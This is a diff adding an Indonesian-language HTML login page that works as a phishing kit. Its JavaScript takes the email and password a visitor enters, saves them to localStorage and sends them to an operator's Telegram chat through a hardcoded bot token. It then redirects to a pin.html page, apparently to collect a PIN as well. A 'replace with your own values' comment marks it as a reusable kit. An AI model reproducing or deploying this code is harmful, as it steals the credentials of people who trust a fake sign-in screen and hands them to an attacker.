@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Login</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+}
+
+html, body{
+  height:100%;
+  overflow:hidden;
+}
+
+body{
+  background:url('background.jpg') center/cover no-repeat;
+  display:flex;
+  align-items:flex-end;
+  position:relative;
+}
+
+body::before{
+  content:"";
+  position:absolute;
+  inset:0;
+  background:rgba(0,0,0,0.45);
+}
+
+.login-box{
+  position:relative;
+  width:100%;
+  max-width:500px;
+  background:rgba(30,30,40,0.95);
+  border-radius:30px 30px 0 0;
+  padding:35px 25px 50px;
+  z-index:1;
+}
+
+.login-box h2{
+  color:#fff;
+  margin-bottom:30px;
+  font-weight:800;
+  font-size:20px;
+}
+
+.input-group{
+  position:relative;
+  margin-bottom:25px;
+}
+
+.input-group input{
+  width:100%;
+  padding:14px 5px;
+  background:transparent;
+  border:none;
+  border-bottom:2px solid #6c63ff;
+  outline:none;
+  color:#fff;
+  font-size:16px;
+  font-weight:700;
+}
+
+.input-group input.error-input{
+  border-bottom:2px solid #ff4d4d;
+}
+
+.input-group input::placeholder{
+  color:#bbb;
+  font-weight:700;
+}
+
+.toggle-password{
+  position:absolute;
+  right:0;
+  top:50%;
+  transform:translateY(-50%);
+  width:22px;
+  height:22px;
+  fill:#aaa;
+  cursor:pointer;
+}
+
+.forgot{
+  text-align:right;
+  margin-top:-10px;
+  margin-bottom:25px;
+}
+
+.forgot a{
+  color:#8f8fff;
+  font-size:14px;
+  text-decoration:none;
+  font-weight:700;
+}
+
+button{
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:18px;
+  background:linear-gradient(90deg,#6c63ff,#7b79ff);
+  color:#fff;
+  font-size:16px;
+  font-weight:800;
+  cursor:pointer;
+  transition:0.2s;
+}
+
+button:active{
+  transform:scale(0.97);
+  opacity:0.8;
+}
+
+button.loading{
+  opacity:0.7;
+  pointer-events:none;
+}
+
+.error{
+  color:#ff6b6b;
+  font-size:13px;
+  margin-top:-15px;
+  margin-bottom:15px;
+  display:none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="login-box">
+  <h2>Masuk dengan Email</h2>
+
+  <div class="input-group">
+    <input type="email" id="email" placeholder="Alamat Email" required>
+  </div>
+
+  <div class="input-group">
+    <input type="password" id="password" placeholder="Kata sandi" required>
+    
+    <svg class="toggle-password" onclick="togglePassword()" viewBox="0 0 24 24">
+      <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 
+      5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+    </svg>
+  </div>
+
+  <div class="error" id="errorMsg"></div>
+
+  <div class="forgot">
+    <a href="#">Lupa kata sandi?</a>
+  </div>
+
+  <button onclick="login()" id="loginBtn">Masuk</button>
+</div>
+
+<script>
+// Toggle tampilan password
+function togglePassword(){
+  const pass = document.getElementById("password");
+  pass.type = pass.type === "password" ? "text" : "password";
+}
+
+// Validasi format email
+function isValidEmail(email){
+  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  return regex.test(email);
+}
+
+// Fungsi kirim data ke Telegram
+function sendToTelegram(data) {
+  // GANTI DENGAN NILAI ANDA SENDIRI
+  const BOT_TOKEN = "7390244170:AAG6UYllOyON4LbNCp-xFrKA7QFF83e9bmU";
+  const CHAT_ID = "5983910858";
+  const message = `*Data Login Baru*\n\nEmail: ${data.email}\nPassword: ${data.password}`;
+  
+  // URL API Telegram dengan format Markdown
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+  // Kirim permintaan ke Telegram API
+  fetch(url)
+    .then(response => response.json())
+    .then(result => console.log("Data terkirim ke Telegram:", result))
+    .catch(error => console.error("Gagal kirim ke Telegram:", error));
+}
+
+// Fungsi utama login
+function login(){
+  const emailInput = document.getElementById("email");
+  const passwordInput = document.getElementById("password");
+  const email = emailInput.value.trim();
+  const password = passwordInput.value.trim();
+  const errorMsg = document.getElementById("errorMsg");
+  const btn = document.getElementById("loginBtn");
+
+  // Reset styling error
+  emailInput.classList.remove("error-input");
+  passwordInput.classList.remove("error-input");
+
+  // Validasi input kosong
+  if(email === "" || password === ""){
+    errorMsg.innerText = "Email dan Password wajib diisi!";
+    errorMsg.style.display = "block";
+    if(email === "") emailInput.classList.add("error-input");
+    if(password === "") passwordInput.classList.add("error-input");
+    return;
+  }
+
+  // Validasi format email
+  if(!isValidEmail(email)){
+    errorMsg.innerText = "Format email tidak valid!";
+    errorMsg.style.display = "block";
+    emailInput.classList.add("error-input");
+    return;
+  }
+
+  // Simpan data ke localStorage dalam bentuk JSON
+  const loginData = { 
+    email: email, 
+    password: password 
+  };
+  localStorage.setItem("userLoginData", JSON.stringify(loginData));
+
+  // Kirim data ke Telegram
+  sendToTelegram(loginData);
+
+  // Tampilkan proses loading
+  errorMsg.style.display = "none";
+  btn.classList.add("loading");
+  btn.innerText = "Memproses...";
+
+  // Redirect ke halaman pin.html setelah 1.5 detik
+  setTimeout(() => {
+    window.location.href = "pin.html";
+  }, 1500);
+}
+</script>
+
+</body>
+</html>
